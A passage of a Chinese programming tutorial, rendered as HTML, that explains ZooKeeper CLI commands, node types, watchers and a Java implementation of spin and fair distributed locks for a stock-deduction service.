cdl.countDown();<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-Zookeeper分布式锁"><a href="#3-Zookeeper分布式锁" class="headerlink" title="3. Zookeeper分布式锁"></a>3. Zookeeper分布式锁</h2><h3 id="3-1-Zookeeper基本指令"><a href="#3-1-Zookeeper基本指令" class="headerlink" title="3.1 Zookeeper基本指令"></a>3.1 Zookeeper基本指令</h3><ol><li><p>查看某个目录下的子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /<br><span class="hljs-built_in">ls</span> /node<br></code></pre></td></tr></table></figure></li><li><p>创建节点 create命令</p><p>在根目录创建 <code>node</code> 节点，其内容为 “abc”</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">create /<span class="hljs-keyword">node</span> <span class="hljs-title">&quot;abc</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>更新节点内容 set命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> /node <span class="hljs-string">&quot;aaa&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>获取节点数据 get命令</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">get /<span class="hljs-keyword">node</span><br><span class="hljs-title">get</span> -s /<span class="hljs-keyword">node</span> <span class="hljs-title">获取详细内容</span><br></code></pre></td></tr></table></figure></li><li><p>删除节点 delete命令</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">delete /<span class="hljs-keyword">node</span><span class="hljs-title"></span><br></code></pre></td></tr></table></figure></li></ol><h3 id="3-2-ZNode节点类型"><a href="#3-2-ZNode节点类型" class="headerlink" title="3.2 ZNode节点类型"></a>3.2 ZNode节点类型</h3><p>永久节点：一旦节点被创建就一直存在，及时Zookeeper宕机也不会被删除，只能手动将其删除</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">create /<span class="hljs-keyword">node</span><span class="hljs-title"></span><br></code></pre></td></tr></table></figure><p>临时节点：临时节点的生命周期与客户端会话相绑定，会话消失则节点也会随之消失。并且临时节点只能做叶子节点，不能创建子节点</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">create -e /<span class="hljs-keyword">node</span><span class="hljs-title"></span><br></code></pre></td></tr></table></figure><p>永久序列化节点：具有永久节点的特性，而且在创建该类节点时，Zookeeper会在节点名称后加入顺序编号</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">create -s /<span class="hljs-keyword">node</span><span class="hljs-title"></span><br></code></pre></td></tr></table></figure><p>临时序列化节点：具有临时节点的特性，而且在创建该类节点时，Zookeeper会在节点名称后加入顺序编号</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">create -e -s /<span class="hljs-keyword">node</span><span class="hljs-title"></span><br></code></pre></td></tr></table></figure><h3 id="3-3-事件监听"><a href="#3-3-事件监听" class="headerlink" title="3.3 事件监听"></a>3.3 事件监听</h3><p>Watcher事件监听器：监听是一次性的，一个监听指令只能监听到一次变化</p><p>同时开启两个zk客户端，一个客户端用于监听，另一个客户端用于操作节点</p><ol><li><p>节点创建：NodeCreated</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> -w /xx<br></code></pre></td></tr></table></figure></li><li><p>节点删除：NodeDeleted</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> -w /xx<br></code></pre></td></tr></table></figure></li><li><p>节点数据变化：NodeDataChanged</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> -w /xx<br></code></pre></td></tr></table></figure></li><li><p>子节点变化：NodeChildrenChanged</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监听xx下的子节点变化</span><br><span class="hljs-built_in">ls</span> -w /xx <br></code></pre></td></tr></table></figure></li></ol><h3 id="3-4-Java客户端"><a href="#3-4-Java客户端" class="headerlink" title="3.4 Java客户端"></a>3.4 Java客户端</h3><h4 id="3-4-1-案例搭建"><a href="#3-4-1-案例搭建" class="headerlink" title="3.4.1 案例搭建"></a>3.4.1 案例搭建</h4><ol><li><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-log4j12<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>创建ZkTest类，在main方法编写如下代码</p><ul><li>Zookeeper构造方法中需要填的参数<ul><li>ip地址与端口号port</li><li>超时时间</li><li>Watcher事件监听器匿名类</li></ul></li><li>用CountDownLatch，使Zookeeper在获取到链接之后才进行之后的操作</li><li>Watcher事件监听中：监听获取链接与关闭链接两个事件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zooKeeper</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">countDownLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">try</span> &#123;<br>    zooKeeper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">&quot;127.0.0.1:2181&quot;</span>, <span class="hljs-number">30000</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Watcher</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent watchedEvent)</span> &#123;<br>            Event.<span class="hljs-type">KeeperState</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> watchedEvent.getState();<br>            <span class="hljs-keyword">if</span> (Event.KeeperState.SyncConnected.equals(state)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;获取链接：&quot;</span> + watchedEvent);<br>                countDownLatch.countDown();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Event.KeeperState.Closed.equals(state)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;关闭链接：&quot;</span> + watchedEvent);<br>            &#125;<br>        &#125;<br>    &#125;);<br>    countDownLatch.await();<br>    System.out.println(<span class="hljs-string">&quot;执行操作...&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    <span class="hljs-keyword">if</span> (zooKeeper != <span class="hljs-literal">null</span>) &#123;<br>        zooKeeper.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">获取链接：WatchedEvent <span class="hljs-keyword">state</span>:SyncConnected type:None path:null<br>执行操作...<br>关闭链接：WatchedEvent <span class="hljs-keyword">state</span>:Closed type:None path:null<br></code></pre></td></tr></table></figure></li></ol><h4 id="3-4-2-操作节点"><a href="#3-4-2-操作节点" class="headerlink" title="3.4.2 操作节点"></a>3.4.2 操作节点</h4><ol><li><p>创建节点：第一个参数为节点名路径，第二参数为节点内容，第三个参数为节点权限，第四个参数为节点类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 永久节点</span><br>zooKeeper.create(<span class="hljs-string">&quot;ltyzzz/test1&quot;</span>, <span class="hljs-string">&quot;hello zookeeper&quot;</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);<br><span class="hljs-comment">// 临时节点</span><br>zooKeeper.create(<span class="hljs-string">&quot;ltyzzz/test2&quot;</span>, <span class="hljs-string">&quot;hello zookeeper&quot;</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL);<br><span class="hljs-comment">// 永久序列化节点</span><br>zooKeeper.create(<span class="hljs-string">&quot;ltyzzz/test3&quot;</span>, <span class="hljs-string">&quot;hello zookeeper&quot;</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT_SEQUENTIAL);<br><span class="hljs-comment">// 临时序列化节点 </span><br>zooKeeper.create(<span class="hljs-string">&quot;ltyzzz/test3&quot;</span>, <span class="hljs-string">&quot;hello zookeeper&quot;</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);<br></code></pre></td></tr></table></figure></li><li><p>查询节点</p><ol><li><p>判断节点是否存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Stat</span> <span class="hljs-variable">exists</span> <span class="hljs-operator">=</span> zooKeeper.exists(<span class="hljs-string">&quot;/ltyzzz&quot;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (exists != <span class="hljs-literal">null</span>) &#123;<br>    System.out.println(<span class="hljs-string">&quot;当前节点存在&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;当前节点不存在&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>获取当前节点中的数据内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] data = zooKeeper.getData(<span class="hljs-string">&quot;/ltyzzz&quot;</span>, <span class="hljs-literal">false</span>, exists);<br>System.out.println(<span class="hljs-string">&quot;当前节点内容：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data));<br></code></pre></td></tr></table></figure></li><li><p>获取当前节点的子节点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; children = zooKeeper.getChildren(<span class="hljs-string">&quot;/ltyzzz&quot;</span>, <span class="hljs-literal">false</span>);<br>System.out.println(<span class="hljs-string">&quot;当前节点的子节点：&quot;</span> + children);<br></code></pre></td></tr></table></figure></li></ol></li><li><p>更新节点</p><ul><li>其中第三个参数为版本号。该版本号必须和当前节点版本号一致，否则更新失败（乐观锁）</li><li>可以将其指定为-1，表示不关心版本号</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">zooKeeper.setData(<span class="hljs-string">&quot;/ltyzzz&quot;</span>, <span class="hljs-string">&quot;zzz...&quot;</span>.getBytes(), exists.getVersion());<br>zooKeeper.setData(<span class="hljs-string">&quot;/ltyzzz&quot;</span>, <span class="hljs-string">&quot;zzz...&quot;</span>.getBytes(), -<span class="hljs-number">1</span>); <span class="hljs-comment">// 不关心版本号</span><br></code></pre></td></tr></table></figure></li><li><p>删除操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">zooKeeper.delete(<span class="hljs-string">&quot;/ltyzzz/test1&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// 不关心版本号</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="3-4-3-节点监听事件"><a href="#3-4-3-节点监听事件" class="headerlink" title="3.4.3 节点监听事件"></a>3.4.3 节点监听事件</h4><p>每一个操作节点的方法中均有一个watch参数，为boolean类型。</p><p>watch为true时，代表启动节点监听事件</p><h3 id="3-5-实现Zookeeper分布式锁"><a href="#3-5-实现Zookeeper分布式锁" class="headerlink" title="3.5 实现Zookeeper分布式锁"></a>3.5 实现Zookeeper分布式锁</h3><p>独占排他：ZNode节点不可重复</p><h4 id="3-5-1-自旋锁版本"><a href="#3-5-1-自旋锁版本" class="headerlink" title="3.5.1 自旋锁版本"></a>3.5.1 自旋锁版本</h4><ol><li><p>创建ZkClient，用于初始化时获取Zk链接与结束时释放Zk链接</p><ul><li>添加@Component注解，交给Spring容器管理，SpringBoot启动时会执行初始化操作</li><li>@PostConstruct：执行完ZkClient构造方法之后，获取Zookeeper链接</li><li>@PreDestroy：在ZkClient销毁之前，释放Zookeeper链接</li><li>getLock：用于创建锁对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZkClient</span> &#123;<br><br>    <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zooKeeper</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-meta">@PostConstruct</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 获取Zk链接</span><br>        <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">countDownLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            zooKeeper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">&quot;127.0.0.1:2181&quot;</span>, <span class="hljs-number">30000</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Watcher</span>() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent watchedEvent)</span> &#123;<br>                    Event.<span class="hljs-type">KeeperState</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> watchedEvent.getState();<br>                    <span class="hljs-keyword">if</span> (Event.KeeperState.SyncConnected.equals(state)) &#123;<br>                        System.out.println(<span class="hljs-string">&quot;获取链接：&quot;</span> + watchedEvent);<br>                        countDownLatch.countDown();<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Event.KeeperState.Closed.equals(state)) &#123;<br>                        System.out.println(<span class="hljs-string">&quot;关闭链接：&quot;</span> + watchedEvent);<br>                    &#125;<br>                &#125;<br>            &#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@PreDestroy</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 释放Zk链接</span><br>        <span class="hljs-keyword">if</span> (zooKeeper != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                zooKeeper.close();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ZkDistributedLock <span class="hljs-title function_">getLock</span><span class="hljs-params">(String lockName)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZkDistributedLock</span>(zooKeeper, lockName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>创建ZkDistributedLock类，用于实现锁</p><ul><li>所有的锁都将创建在 <code>/locks</code> 目录下，所以在构造方法中，需要先判断有没有该目录，没有的话则需要提前创建</li><li>注意：<code>/locks</code> 为永久节点，而创建出来的锁为临时节点，这是为了防止服务器宕机造成的死锁问题，而设置为临时节点的话，服务器宕机之后，临时节点也会随之被删除。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZkDistributedLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String lockName;<br>    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ROOT_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/locks&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ZkDistributedLock</span><span class="hljs-params">(ZooKeeper zooKeeper, String lockName)</span> &#123;<br>        <span class="hljs-built_in">this</span>.zooKeeper = zooKeeper;<br>        <span class="hljs-built_in">this</span>.lockName = lockName;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (zooKeeper.exists(ROOT_PATH, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) &#123;<br>                zooKeeper.create(ROOT_PATH, <span class="hljs-literal">null</span>, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (KeeperException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 创建ZNode节点</span><br>        tryLock();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockInterruptibly</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            zooKeeper.create(ROOT_PATH + <span class="hljs-string">&quot;/&quot;</span> + lockName, <span class="hljs-literal">null</span>, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">80</span>);<br>                tryLock();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException ex) &#123;<br>                ex.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 删除ZNode节点</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.zooKeeper.delete(ROOT_PATH + <span class="hljs-string">&quot;/&quot;</span> + lockName, -<span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (KeeperException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在StockService中注入ZkClient对象，并修改deduct方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> ZkClient zkClient;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ZkDistributedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> zkClient.getLock(<span class="hljs-string">&quot;lock&quot;</span>);<br>    lock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        lock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="3-5-2-阻塞公平锁版本"><a href="#3-5-2-阻塞公平锁版本" class="headerlink" title="3.5.2 阻塞公平锁版本"></a>3.5.2 阻塞公平锁版本</h4><p>利用临时序列化节点与监听机制实现</p><ol><li><p>临时序列化节点在创建节点时，节点的名称后会追加序列号。</p><p>给每一个获取锁的请求都创建一个临时序列化节点，越先尝试获取锁的节点，其序列号越小，优先级越高，满足公平锁的定义</p><ol><li>获取当前节点的前驱节点<ul><li>若前驱节点为空，则获取锁成功，否则监听前驱节点</li></ul></li><li>获取锁成功后执行业务操作，最后释放当前节点的锁</li></ol></li><li><p>后创建的节点监听它之前的一个节点，如果监听到它的前驱节点被删除，则相当于获取到锁；否则阻塞</p><p>（类似于AQS中同步队列的定义）</p></li></ol><p>改造之前的代码：更改tryLock与unlock代码</p><p>注意：</p><ol><li>Zookeeper调用create方法后，会返回其全路径，这里将其作为了成员变量，方便解锁时删除</li><li>路径中加上了“-”，方便之后获取每个节点的序列号</li><li>通过编写getPreNode方法，获取当前节点的前驱节点</li><li>通过CountDownLatch实现阻塞功能</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 